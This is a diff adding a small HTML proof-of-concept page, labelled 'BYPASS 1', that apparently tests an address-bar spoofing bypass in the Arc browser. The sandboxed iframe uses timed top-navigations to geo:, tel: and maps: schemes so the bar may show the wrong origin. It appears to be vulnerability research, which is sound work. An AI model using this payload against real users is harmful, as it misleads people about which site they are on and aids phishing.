@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head><title>.</title></head>
+<body>
+<!--
+  BYPASS 1: sandbox + allow-top-navigation
+
+  This iframe has sandbox="allow-scripts allow-top-navigation" set by the parent.
+  When we do top.location = "geo:0,0", the TOP FRAME genuinely navigates.
+  The WKNavigationDelegate sees isMainFrame=true (because top IS the main frame).
+
+  But here's the trick: the navigation was INITIATED by a subframe.
+  Arc's fix checks targetFrame.isMainFrame, but the sourceFrame is still THIS iframe.
+  If Arc reads the sourceFrame's origin to display in the bar, it shows our domain
+  instead of the top frame's original domain.
+-->
+<script>
+  // Delay to ensure parent is fully loaded
+  setTimeout(function() {
+    try {
+      top.location.href = "geo:0,0";
+    } catch(e) {
+      // Fallback: try with location.assign
+      try { top.location.assign("geo:0,0"); } catch(e2) {}
+    }
+  }, 200);
+
+  // Second attempt with different scheme
+  setTimeout(function() {
+    try {
+      top.location.href = "tel:+1234567890";
+    } catch(e) {}
+  }, 600);
+
+  // Third attempt: maps scheme
+  setTimeout(function() {
+    try {
+      top.location.href = "maps:0,0";
+    } catch(e) {}
+  }, 1000);
+</script>
+</body>
+</html>
